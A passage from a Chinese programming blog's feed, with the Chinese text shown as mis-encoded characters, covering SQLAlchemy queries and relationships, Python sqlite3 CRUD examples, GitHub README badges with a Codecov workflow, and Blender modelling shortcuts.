é™åºï¼ˆéœ€è¦å¯¼å…¥descæ–¹æ³•ï¼‰</span></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> desc</span><span class="line"></br></span><span class="line">users = session.query(User).order_by(desc(User.name))</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.6 åªæŸ¥è¯¢éƒ¨åˆ†å±æ€§</span></span><span class="line">users = session.query(User.name).order_by(desc(User.name))</span><span class="line"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(user.name)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.7 ç»™ç»“æœé›†çš„åˆ—å–åˆ«å</span></span><span class="line">users = session.query(User.name.label(<span class="hljs-string">&#x27;user_name&#x27;</span>)).<span class="hljs-built_in">all</span>()</span><span class="line"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(user.user_name)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.8 å»é‡æŸ¥è¯¢(éœ€è¦å¯¼å…¥distinctæ–¹æ³•)</span></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> distinct</span><span class="line"></br></span><span class="line">users = session.query(distinct(User.name).label(<span class="hljs-string">&#x27;name&#x27;</span>)).<span class="hljs-built_in">all</span>()</span><span class="line"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(user.name)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.9 ç»Ÿè®¡æŸ¥è¯¢(éœ€è¦å¯¼å…¥func)</span></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> func</span><span class="line"></br></span><span class="line">user_count = session.query(User.name).order_by(User.name).count()</span><span class="line">age_avg = session.query(func.avg(User.age)).first()</span><span class="line">age_sum = session.query(func.<span class="hljs-built_in">sum</span>(User.age)).first()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.10 åˆ†ç»„æŸ¥è¯¢</span></span><span class="line">users = session.query(func.count(User.name).label(<span class="hljs-string">&#x27;count&#x27;</span>), User.age).group_by(User.age)</span><span class="line"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ags: <span class="hljs-subst">&#123;user.age&#125;</span>, count: <span class="hljs-subst">&#123;user.count&#125;</span>&#x27;</span>)</span><span class="line"></br></span><span class="line">session.commit()</span><span class="line"></br></span><span class="line">session.close()</span></code></pre></div></div><h4 id="å¤šè¡¨å…³è”"><a href="#å¤šè¡¨å…³è”" class="headerlink" title="å¤šè¡¨å…³è”"></a>å¤šè¡¨å…³è”</h4><p>ç°åœ¨æˆ‘ä»¬å°†<code>Role</code>å…³è”åˆ°<code>User</code>ä¸Šï¼Œä½¿æ¯ä¸ªUseréƒ½å¯ä»¥æ‹¥æœ‰ä¸¤ä¸ªRoleèº«ä»½ã€‚</p><p>æ‰€ä»¥è¦åœ¨çˆ¶è¡¨ä¸Šåˆ›å»ºå¤–é”®ï¼Œç„¶åä½¿ç”¨<code>relationship</code>è¿›è¡Œå…³è”</p><div class="codeBlockContainer"><div class="codeBlockTitle">models/user.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, ForeignKey, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> relationship</span><span class="line"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> Base</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;users&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))</span><span class="line">    age = Column(Integer)</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># æ·»åŠ è§’è‰²idå¤–é”®ï¼ˆå…³è”åˆ°Roleè¡¨çš„idå±æ€§ï¼‰, è¿™é‡Œä½¿ç”¨çš„è¡¨åå’Œåˆ—å</span></span><span class="line">    <span class="hljs-comment"># è¿™ä¸ªå€¼åªä¼šåœ¨å†™å…¥åˆ°æ•°æ®åº“çš„æ—¶å€™è‡ªåŠ¨æ·»åŠ </span></span><span class="line">    role_id = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;roles.id&#x27;</span>))</span><span class="line">    <span class="hljs-comment"># æ·»åŠ ç¬¬äºŒè§’è‰²å¤–é”®</span></span><span class="line">    second_role_id = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;roles.id&#x27;</span>))</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># æ·»åŠ å…³è”å±æ€§ï¼Œå…³è”åˆ°role_idä¸Š, è¿™é‡Œä½¿ç”¨çš„æ˜¯ç±»åå’Œå±æ€§å</span></span><span class="line">    role = relationship(</span><span class="line">        <span class="hljs-string">&#x27;Role&#x27;</span>,</span><span class="line">        foreign_keys=<span class="hljs-string">&#x27;User.role_id&#x27;</span>, <span class="hljs-comment"># éƒ½æŒ‡åˆ°çˆ¶è¡¨çš„å¤–é”®ä¸Š</span></span><span class="line">        back_populates=<span class="hljs-string">&#x27;users&#x27;</span>,  <span class="hljs-comment"># æŒ‡åˆ°å…³è”è¡¨å¯¹åº”çš„relationshipå±æ€§ä¸Š</span></span><span class="line">    )</span><span class="line">    <span class="hljs-comment"># æ·»åŠ å…³è”å±æ€§ï¼Œå…³è”åˆ°second_role_idä¸Š</span></span><span class="line">    second_role = relationship(</span><span class="line">        <span class="hljs-string">&#x27;Role&#x27;</span>,</span><span class="line">        foreign_keys=<span class="hljs-string">&#x27;User.second_role_id&#x27;</span>,</span><span class="line">        back_populates=<span class="hljs-string">&#x27;second_users&#x27;</span>,</span><span class="line">    )</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">models/role.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> relationship</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> Base</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Role</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;roles&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># æ·»åŠ ä¸User.role_idçš„å…³è”</span></span><span class="line">    users = relationship(</span><span class="line">        <span class="hljs-string">&#x27;User&#x27;</span>,</span><span class="line">        foreign_keys=<span class="hljs-string">&#x27;User.role_id&#x27;</span>, <span class="hljs-comment"># éƒ½æŒ‡åˆ°çˆ¶è¡¨çš„å¤–é”®ä¸Š</span></span><span class="line">        back_populates=<span class="hljs-string">&#x27;role&#x27;</span>,</span><span class="line">    )</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># æ·»åŠ ä¸User.second_idçš„å…³è”</span></span><span class="line">    second_users = relationship(</span><span class="line">        <span class="hljs-string">&#x27;User&#x27;</span>,</span><span class="line">        foreign_keys=<span class="hljs-string">&#x27;User.second_role_id&#x27;</span>,</span><span class="line">        back_populates=<span class="hljs-string">&#x27;second_role&#x27;</span>,</span><span class="line">    )</span></code></pre></div></div><p>relationshipä¸­çš„å‚æ•°:</p><p><strong>back_populates å‚æ•°</strong><br>relationship å‡½æ•°æ˜¯ sqlalchemyå¯¹å…³ç³»ä¹‹é—´æä¾›çš„ä¸€ç§ä¾¿åˆ©çš„è°ƒç”¨æ–¹å¼, back_populates å‚æ•°åˆ™å¯¹å…³ç³»æä¾›åå‘å¼•ç”¨çš„å£°æ˜ã€‚<br>åœ¨æœ€æ–°ç‰ˆæœ¬çš„sqlalchemyä¸­å¯¹relationshipå¼•è¿›äº†back_populateså‚æ•°ï¼Œ ä¸¤ä¸ªå‚æ•°çš„æ•ˆæœå®Œå…¨ä¸€è‡´ã€‚</p><p>backref å’Œ back_populates ä¸¤ä¸ªå‚æ•°çš„åŒºåˆ«</p><ul><li>backref åªéœ€è¦åœ¨ Parent ç±»ä¸­å£°æ˜ childrenï¼ŒChild.parent ä¼šè¢«åŠ¨æ€åˆ›å»ºã€‚</li><li>back_populates å¿…é¡»åœ¨ä¸¤ä¸ªç±»ä¸­æ˜¾å¼åœ°ä½¿ç”¨ back_populatesï¼Œæ›´æ˜¾ç¹çï¼Œç†è§£æ›´ç›´è§‚</li></ul><p><strong>uselist</strong><br>å¦‚æœæ˜¯ä¸€å¯¹ä¸€çš„è¯ï¼Œå¯ä»¥åŠ ä¸Š<code>uselist=False</code>, é‚£ä¹ˆè¿”å›çš„å°±æ˜¯å•ä¸ªï¼Œè€Œä¸æ˜¯æ•°ç»„äº†</p><div class="codeBlockContainer"><div class="codeBlockTitle">learn_sqlalchemy_relationship.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"><span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> Base</span><span class="line"><span class="hljs-keyword">from</span> models.user <span class="hljs-keyword">import</span> User</span><span class="line"><span class="hljs-keyword">from</span> models.role <span class="hljs-keyword">import</span> Role</span><span class="line"></br></span><span class="line">root_path = os.path.dirname(__file__).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="line">DB_CONNECT_STRING = <span class="hljs-string">f&#x27;sqlite:///<span class="hljs-subst">&#123;root_path&#125;</span>/sqlalchemy_relationship.db&#x27;</span></span><span class="line"></br></span><span class="line">engine = create_engine(DB_CONNECT_STRING, echo=<span class="hljs-literal">True</span>)</span><span class="line">DB_Session = sessionmaker(bind=engine)</span><span class="line">session = DB_Session()</span><span class="line"></br></span><span class="line">Base.metadata.create_all(engine)</span><span class="line"></br></span><span class="line">u = User(name=<span class="hljs-string">&#x27;dog&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line">r = Role(name=<span class="hljs-string">&#x27;admin&#x27;</span>)</span><span class="line">r2 = Role(name=<span class="hljs-string">&#x27;user&#x27;</span>)</span><span class="line"></br></span><span class="line">u.role = r</span><span class="line">u.second_role = r2</span><span class="line">session.add(u)</span><span class="line">session.commit()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># è”åˆæŸ¥è¯¢</span></span><span class="line">users = session.query(User).join(Role, Role.<span class="hljs-built_in">id</span> == User.role_id)</span><span class="line"><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(u.name)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># å¤šè¡¨æŸ¥è¯¢</span></span><span class="line">users = session.query(User, Role).<span class="hljs-built_in">filter</span>(User.role_id == Role.<span class="hljs-built_in">id</span>)</span><span class="line"><span class="hljs-keyword">for</span> u, r <span class="hljs-keyword">in</span> users:</span><span class="line">    <span class="hljs-built_in">print</span>(u.name)</span><span class="line"></br></span><span class="line">session.close()</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sqlite3 ä½¿ç”¨</title>
      <link href="/2022/10/20/python-sqlite3-%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/10/20/python-sqlite3-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>python3 ä¸­è‡ªå¸¦<code>sqlite3</code>æ•°æ®åº“ï¼Œæ— éœ€å®‰è£…ã€‚æ‰€ä»¥å­¦ä¹ å’Œä½¿ç”¨<code>sqlite3</code>éƒ½æ˜¯éå¸¸å€¼å¾—çš„ã€‚</p><p><code>sqlite</code>ä¸­çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µå°±æ˜¯æ¸¸æ ‡ï¼Œå¯ä»¥ç†è§£ä¸ºwindowsä¸­çš„æ–‡ä»¶å¥æŸ„ï¼Œæˆ–è€…å°±æ˜¯æ•°ç»„ä¸­çš„æŒ‡é’ˆã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> sqlite3</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># è¿æ¥æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»º</span></span><span class="line">con = sqlite3.connect(<span class="hljs-string">&#x27;test.db&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºæ¸¸æ ‡</span></span><span class="line">cur = con.cursor()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºè¡¨</span></span><span class="line">cur.execute(</span><span class="line">    <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS test(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, age INTEGER)&quot;</span></span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ----- å¢ -----</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æ’å…¥æ•°æ®</span></span><span class="line">cur.execute(<span class="hljs-string">&quot;INSERT INTO test(name, age) VALUES(?, ?)&quot;</span>, (<span class="hljs-string">&quot;elin&quot;</span>, <span class="hljs-number">30</span>))</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># or æ’å…¥å¤šæ¡æ•°æ®</span></span><span class="line">cur.executemany(<span class="hljs-string">&quot;INSERT INTO TEST(name, age) VALUES(?, ?)&quot;</span>, [(<span class="hljs-string">&#x27;lili&#x27;</span>, <span class="hljs-number">27</span>), (<span class="hljs-string">&#x27;wulu&#x27;</span>, <span class="hljs-number">3</span>)])</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ----- åˆ  -----</span></span><span class="line">cur.execute(<span class="hljs-string">&quot;DELETE FROM test WHERE name = ?&quot;</span>, (<span class="hljs-string">&quot;wulu&quot;</span>,))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ----- æ”¹ -----</span></span><span class="line">cur.execute(<span class="hljs-string">&quot;UPDATE test SET age = ? WHERE name = ?&quot;</span>, (<span class="hljs-number">28</span>, <span class="hljs-string">&quot;lili&quot;</span>))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ----- æŸ¥ -----</span></span><span class="line"><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®</span></span><span class="line">res = cur.execute(<span class="hljs-string">&quot;SELECT * FROM test&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># è½®è¯¢</span></span><span class="line"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> res.fetchall():</span><span class="line">    <span class="hljs-built_in">print</span>(row)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æäº¤</span></span><span class="line">con.commit()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># å›æ»š, å¦‚æœå‡ºç°é”™è¯¯ï¼Œå¯ä»¥å›æ»šåˆ°ä¸Šä¸€æ¬¡æäº¤çš„çŠ¶æ€</span></span><span class="line">con.rollback()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ é™¤è¡¨</span></span><span class="line">cur.execute(<span class="hljs-string">&quot;DROP TABLE test&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># å…³é—­æ¸¸æ ‡</span></span><span class="line">cur.close()</span><span class="line"><span class="hljs-comment"># å…³é—­æ•°æ®åº“</span></span><span class="line">con.close()</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­æ–‡ç¼–ç ä¹±ç é—®é¢˜</title>
      <link href="/2022/10/20/%E4%B8%AD%E6%96%87%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/"/>
      <url>/2022/10/20/%E4%B8%AD%E6%96%87%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><img src="/2022/10/20/%E4%B8%AD%E6%96%87%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/1.jpg"></p><p><a href="/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/" title="python ä¸€åŠ³æ°¸é€¸çš„ decode å­—ç¬¦ä¸²è½¬æ¢æ–¹æ³•">python ä¸€åŠ³æ°¸é€¸çš„ decode å­—ç¬¦ä¸²è½¬æ¢æ–¹æ³•</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>github READMEä¸­æ·»åŠ å¾½ç« </title>
      <link href="/2022/09/28/github-README%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%BE%BD%E7%AB%A0/"/>
      <url>/2022/09/28/github-README%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%BE%BD%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2022/09/28/github-README%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%BE%BD%E7%AB%A0/1.png"></p><p><code>README.md</code>ä¸­æ·»åŠ å¾½ç« çš„æ–¹æ³•</p><h2 id="é™æ€æ ‡ç­¾"><a href="#é™æ€æ ‡ç­¾" class="headerlink" title="é™æ€æ ‡ç­¾"></a>é™æ€æ ‡ç­¾</h2><p>å¤§éƒ¨åˆ†æ ‡ç­¾å¯ä»¥å†<a href="https://shields.io/">shields.io</a>ä¸­æ‰¾åˆ°å¹¶ç›´æ¥ä½¿ç”¨</p><h2 id="Github-Actions-å¾½ç« "><a href="#Github-Actions-å¾½ç« " class="headerlink" title="Github Actions å¾½ç« "></a>Github Actions å¾½ç« </h2><ul><li><a href="https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/adding-a-workflow-status-badge">å®˜æ–¹å‚è€ƒ</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/&lt;OWNER&gt;/</span>&lt;REPOSITORY&gt;<span class="hljs-regexp">/actions/</span>workflows<span class="hljs-regexp">/&lt;WORKFLOW_FILE&gt;/</span>badge.svg</span></code></pre></div></div><h2 id="ä»£ç æµ‹è¯•è¦†ç›–ç‡æ ‡ç­¾"><a href="#ä»£ç æµ‹è¯•è¦†ç›–ç‡æ ‡ç­¾" class="headerlink" title="ä»£ç æµ‹è¯•è¦†ç›–ç‡æ ‡ç­¾"></a>ä»£ç æµ‹è¯•è¦†ç›–ç‡æ ‡ç­¾</h2><p>ä½¿ç”¨<a href="https://app.codecov.io/">codecov</a></p><p>æ³¨å†Œæˆæƒåï¼Œé€‰æ‹©ä»“åº“ï¼Œå°†<code>TOKEN</code>å¤åˆ¶åˆ°<code>Github</code>çš„<code>Secrets</code>ä¸­ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Coverage</span> <span class="hljs-string">upload</span> <span class="hljs-string">to</span> <span class="hljs-string">Codecov</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">coverage:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v4</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">&quot;3.x&quot;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Dependencies</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">          python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">          pip install poetry</span></span><span class="line"><span class="hljs-string">          poetry install</span></span><span class="line"><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Pytest</span> <span class="hljs-string">Coverage</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">          poetry run python -m pytest --cov --cov-report xml</span></span><span class="line"><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">coverage</span> <span class="hljs-string">to</span> <span class="hljs-string">Codecov</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">codecov/codecov-action@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">token:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.CODECOV_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">          <span class="hljs-attr">file:</span> <span class="hljs-string">./coverage.xml</span></span><span class="line">          <span class="hljs-attr">flags:</span> <span class="hljs-string">unittests</span></span></code></pre></div></div><p>pullåç­‰å¾…action ä¸Šä¼  <code>coverage.xml</code>æ–‡ä»¶åˆ°<code>codecov</code>ã€‚</p><p>ç„¶ååˆ°<code>codecov</code>çš„<code>settings/badge</code>ä¸­é€‰æ‹©<code>markdown</code>ï¼Œå¤åˆ¶åˆ°<code>README.md</code>ä¸­ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blenderå»ºæ¨¡æŠ€å·§</title>
      <link href="/2022/09/25/blender%E5%BB%BA%E6%A8%A1%E6%8A%80%E5%B7%A7/"/>
      <url>/2022/09/25/blender%E5%BB%BA%E6%A8%A1%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<ul><li>ä»¥ä¸‹å‚è€ƒè§†é¢‘æ¥æº<a href="https://www.bilibili.com/video/BV1dk4y127ta/?spm_id_from=333.999.0.0&vd_source=1a94b4cd37e84a7ae7d6667c6725e380">100ä¸ªå»ºæ¨¡æŠ€å·§</a></li></ul><table><thead><tr><th>æè¿°</th><th>å¿«æ·é”®</th></tr></thead><tbody><tr><td>ä»é¡¶ç‚¹åˆ›å»ºè¾¹/é¢</td><td><code>f</code></td></tr><tr><td>é“¾æ¥ä¸¤ä¸ªç‚¹</td><td><code>j</code></td></tr><tr><td>ç‰©ä½“ä¸‹åº”ç”¨</td><td><code>Ctrl + A</code></td></tr><tr><td>çˆ¶çº§ç›®æ ‡</td><td><code>Ctrl + P</code></td></tr><tr><td>é•œåƒç‰©ä½“</td><td><code>Ctrl + M</code> XYZ</td></tr><tr><td>åˆå¹¶ç‰©ä½“</td><td><code>Ctrl + J</code></td></tr><tr><td>åªæ˜¾ç¤ºé€‰ä¸­éƒ¨åˆ†</td><td><code>Alt + B</code></td></tr><tr><td>å››è§†å›¾</td><td><code>Ctrl + Alt + Q</code></td></tr><tr><td>é‡æ˜¾ä¸Šä¸ªèœå•</td><td><code>F9</code></td></tr><tr><td>æ‰¹é‡å‘½å</td><td><code>Ctrl + F2</code></td></tr></tbody></table><h2 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h2><table><thead><tr><th>æè¿°</th><th>å¿«æ·é”®</th></tr></thead><tbody><tr><td>å¢åŠ å‡å°‘é€‰å–</td><td><code>Ctrl + (+) / (-)</code></td></tr><tr><td>é€‰æ‹©æœ‰ç›¸é“¾æ¥çš„é¢</td><td><code>L</code></td></tr><tr><td>åé€‰</td><td><code>Ctrl + I</code></td></tr><tr><td>æœ€çŸ­è·¯å¾„</td><td><code>Ctrl + Shift + å·¦é”®</code></td></tr><tr><td>é€‰æ‹©ç›¸ä¼¼</td><td><code>Shift + G</code></td></tr><tr><td>æº¶å¹¶è¾¹</td><td><code>Ctrl + X</code></td></tr></tbody></table><p>é—´éš”å¼é€‰æ‹©ï¼Œå¯ä»¥ç”¨æ¥åšé½¿è½®ä»€ä¹ˆçš„</p><h2 id="ç½‘æ ¼"><a href="#ç½‘æ ¼" class="headerlink" title="ç½‘æ ¼"></a>ç½‘æ ¼</h2><table><thead><tr><th>æè¿°</th><th>å¿«æ·é”®</th></tr></thead><tbody><tr><td>æ³•å‘ç¼©æ”¾(æ”¹å˜åŠå¾„)</td><td><code>Alt + S</code></td></tr><tr><td>å€’è§’</td><td><code>Ctrl + B</code></td></tr><tr><td>ç¼–è¾‘æ¨¡å¼ é¢èœå•</td><td><code>Ctrl + F</code></td></tr><tr><td>ç¼–è¾‘æ¨¡å¼ è¾¹èœå•</td><td><code>Ctrl + E</code></td></tr><tr><td>é‡æ–°è®¡ç®—æ³•çº¿</td><td><code>Shift + N</code></td></tr><tr><td>åç§»è¾¹çº¿å¹¶æ»‘è¡Œ</td><td><code>Ctrl + Shift + R</code></td></tr><tr><td>å¤åˆ¶è½¯å¯¹åƒ</td><td><code>Alt + D</code></td></tr><tr><td>å…³è”èœå•</td><td><code>Ctrl + L</code></td></tr><tr><td>å¿«é€Ÿæ”¶è—å¤¹</td><td><code>q</code></td></tr><tr><td>é‡ç½®è’™çš®å°ºå¯¸</td><td><code>Ctrl + A</code></td></tr><tr><td>æ·»åŠ é•œåƒä¿®æ”¹å™¨</td><td><code>Ctrl + M</code></td></tr><tr><td>é€‰æ‹©ç›¸è¿å…ƒç´ </td><td><code>L</code></td></tr></tbody></table><p>æŠ•å½±åˆ‡å‰²ï¼Œ ç¼–è¾‘æ¨¡å¼ä¸‹ï¼Œ<code>Ctrl</code>é€‰ä¸­å¦å¤–ä¸€ä¸ªå¯¹åƒï¼Œåœ¨ç½‘æ ¼ä¸­é€‰æ‹©æŠ•å½±åˆ‡å‰²ã€‚</p><p>æ¡¥æ¥å¾ªç¯è¾¹ï¼Œå¯ä»¥æ–¹ä¾¿é“¾æ¥ä¸¤ä¸ªç‰©ä½“ï¼Œæˆ–è€…æŒ–æ´ã€‚</p><p>å¹³æ»‘ç€è‰²ï¼Œæ³•å‘è‡ªåŠ¨å…‰æ»‘åï¼Œå¯ä»¥<code>è¾¹èœå•</code> æ ‡è®°é”è¾¹ã€‚</p><p>æƒ³è¦æŠ˜è§’ï¼Œ<code>åç§»è¾¹çº¿å¹¶æ»‘è¡Œ</code>ï¼Œç„¶å<code>Alt + S</code> æ³•å‘ç¼©æ”¾å³å¯ã€‚</p><p>æƒ³åœ¨æ–œé¢ä¸Šç§»åŠ¨ï¼Œå°†åæ ‡ç³»æ”¹ä¸º<strong>æ³•å‘</strong>ï¼Œç„¶åè½´å¿ƒç‚¹æ”¹ä¸º<strong>æ´»åŠ¨å…ƒç´ </strong> (è§†é¢‘P1ï¼Œ45ï¼š50)</p><p><code>Shfit + D</code> é™¤äº†å¤åˆ¶è¿˜æœ‰ç§»åŠ¨ï¼Œæ‰€ä»¥ä½¿ç”¨<code>Shfit + R</code>å¯ä»¥é‡å¤å¤åˆ¶åŠ ç§»åŠ¨è¿™ä¸€è¿‡ç¨‹ï¼Œå¾ˆé€‚åˆåšé‡å¤è®¾è®¡ã€‚</p><p>æƒ³è¦å¸é™„åˆ°è¡¨é¢ï¼š <strong>å¸é™„è‡³é¢ + æ—‹è½¬å¯¹å…¶ç›®æ ‡ + é¡¹ç›®çš„å•ç‹¬å…ƒç´ 